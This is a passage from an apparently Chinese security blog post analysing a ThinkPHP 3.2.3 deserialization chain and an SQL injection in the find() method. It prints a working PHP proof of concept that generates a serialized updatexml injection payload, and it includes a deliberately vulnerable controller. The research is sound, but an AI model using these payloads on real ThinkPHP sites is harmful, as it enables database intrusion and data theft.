+            echo base64_encode(serialize(new \Think\Image\Driver\Imagick() ));
+        }
+    }
+}
+</code></pre>
+<p>但是如果拿这个poc去打，会发现有问题</p>
+<figure data-type="image" tabindex="6"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220518000853986.png" alt="image-20220518000853986" loading="lazy"></figure>
+<p>其实这里忽略了一个点，就是在执行sql语句的地方，ThinkPHP/Library/Think/Db/Driver.class.php-&gt;execute,他有这么一行代码<code>$this-&gt;initConnect(true);</code>,他是进行一个初始化数据连接的操作，这里很明显是单数据库，所以要进入connect方法</p>
+<pre><code class="language-php">/**
+ * 初始化数据库连接
+ * @access protected
+ * @param boolean $master 主服务器
+ * @return void
+ */
+protected function initConnect($master=true) {
+    if(!empty($this-&gt;config['deploy']))
+        // 采用分布式数据库
+        $this-&gt;_linkID = $this-&gt;multiConnect($master);
+    else
+        // 默认单数据库
+        if ( !$this-&gt;_linkID ) $this-&gt;_linkID = $this-&gt;connect();
+}
+</code></pre>
+<p>connect方法如下</p>
+<pre><code class="language-php">public function connect($config='',$linkNum=0,$autoConnection=false) {
+    if ( !isset($this-&gt;linkID[$linkNum]) ) {
+        if(empty($config))  $config =   $this-&gt;config;
+        try{
+            if(empty($config['dsn'])) {
+                $config['dsn']  =   $this-&gt;parseDsn($config);
+            }
+            if(version_compare(PHP_VERSION,'5.3.6','&lt;=')){ 
+                // 禁用模拟预处理语句
+                $this-&gt;options[PDO::ATTR_EMULATE_PREPARES]  =   false;
+            }
+            $this-&gt;linkID[$linkNum] = new PDO( $config['dsn'], $config['username'], $config['password'],$this-&gt;options);
+        }catch (\PDOException $e) {
+            if($autoConnection){
+                trace($e-&gt;getMessage(),'','ERR');
+                return $this-&gt;connect($autoConnection,$linkNum);
+            }elseif($config['debug']){
+                E($e-&gt;getMessage());
+            }
+        }
+    }
+    return $this-&gt;linkID[$linkNum];
+}
+</code></pre>
+<p>在第二个if判断，判断$config是否为空，为空则从自身的config从获取，在初始化方法中明显没有参数，所以这里直接从自身的config中获取，所以我们还需要初始化数据库的连接。最后poc如下</p>
+<pre><code class="language-php">&lt;?php
+namespace Think\Image\Driver{
+    use Think\Session\Driver\Memcache;
+    class Imagick{
+        private $img;
+        public function __construct(){
+            $this-&gt;img = new Memcache();
+        }
+    }
+}
+namespace Think\Session\Driver{
+    use Think\Model;
+
+    class Memcache {
+        protected $handle;
+        public function __construct(){
+            $this-&gt;handle = new Model();
+        }
+    }
+}
+namespace Think{
+    use Think\Db\Driver\Mysql;
+    class Model {
+        protected $data=array();
+        protected $pk;
+        protected $options=array();
+        protected $db=null;
+
+        public function __construct()
+        {
+            $this-&gt;db = new Mysql();
+            $this-&gt;options['where'] = '';
+            $this-&gt;pk = 'id';
+            $this-&gt;data[$this-&gt;pk] = array(
+                'where'=&gt;'1=1',
+                'table'=&gt;'mysql.user where 1=updatexml(1,concat(0x7e,user(),0x7e),1)#'
+
+            );
+        }
+    }
+}
+namespace Think\Db\Driver{
+    use PDO;
+    class Mysql {
+        protected $config     = array(
+            'debug'             =&gt;   true,
+            &quot;charset&quot;           =&gt;  &quot;utf8&quot;,
+            'type'              =&gt;  'mysql',     // 数据库类型
+            'hostname'          =&gt;  'localhost', // 服务器地址
+            'database'          =&gt;  'thinkphp',          // 数据库名
+            'username'          =&gt;  'root',      // 用户名
+            'password'          =&gt;  'root',          // 密码
+            'hostport'          =&gt;  '3306',        // 端口
+        );
+    }
+}
+namespace Home\Controller{
+    use Think\Controller;
+    class DemoController extends Controller {
+        public function index(){
+            echo base64_encode(serialize(new \Think\Image\Driver\Imagick() ));
+        }
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220518001431091.png" alt="image-20220518001431091" loading="lazy"></figure>
+<h1 id="thinkphp323-sql注入">Thinkphp3.2.3 SQL注入</h1>
+<p>这里再补一个该版本的SQL注入分析吧，因为感觉如果要重新开一篇比较麻烦，直接就在这继续了。首先我们得制造一个漏洞点</p>
+<pre><code class="language-php">&lt;?php
+namespace Home\Controller;
+use Think\Controller;
+class IndexController extends Controller {
+    public function index(){
+        $data = M('User')-&gt;find(I('GET.id'));
+        var_dump($data);
+    }
+}
+</code></pre>
+<p>ok，我们传入一个id参数，然后用I方法获取。并且调用了find方法，这里的问题就是出在find方法，来随便看看吧</p>
+<pre><code class="language-php">if(is_numeric($options) || is_string($options)) {
+    $where[$this-&gt;getPk()]  =   $options;
+    $options                =   array();
+    $options['where']       =   $where;
+}
+</code></pre>
+<p>这里判断了options是数字或者字符串，如果是的话，直接指定当前查询表的主键为查询字段。同时他也提供了根据复合主键查找记录的功能</p>
+<pre><code class="language-php">$pk  =  $this-&gt;getPk();
+if (is_array($options) &amp;&amp; (count($options) &gt; 0) &amp;&amp; is_array($pk)) {
+    // 根据复合主键查询
+    $count = 0;
+    foreach (array_keys($options) as $key) {
+        if (is_int($key)) $count++; 
+    } 
+    if ($count == count($pk)) {
+        $i = 0;
+        foreach ($pk as $field) {
+            $where[$field] = $options[$i];
+            unset($options[$i++]);
+        }
+        $options['where']  =  $where;
+    } else {
+        return false;
+    }
+}
+</code></pre>
+<p>他是先判断options是否是一个长度大于0的数组并且pk也是一个数组，满足以上条件才能进入if语句，这里的话有两个if语句，但是我们可以直接绕过这两个if语句直接进入到<code>$options=$this-&gt;_parseOptions($options);</code>部分，不满足第一个if需要options是一个数组，满足第二部分需要options数组长度大于0并且pk需要是一个数组，我们现在只要让pk不是数组即可绕过，后面的话就是正常的构造注入语句了。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90">反序列化链分析</a></li>
+<li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%9E%84%E9%80%A0">反序列化链构造</a></li>
+<li><a href="#thinkphp323-sql%E6%B3%A8%E5%85%A5">Thinkphp3.2.3 SQL注入</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ch0x01e.github.io/post/spring-memory-shell/">
+              <h3 class="post-title">
+                Spring Memory Shell
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ch0x01e.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
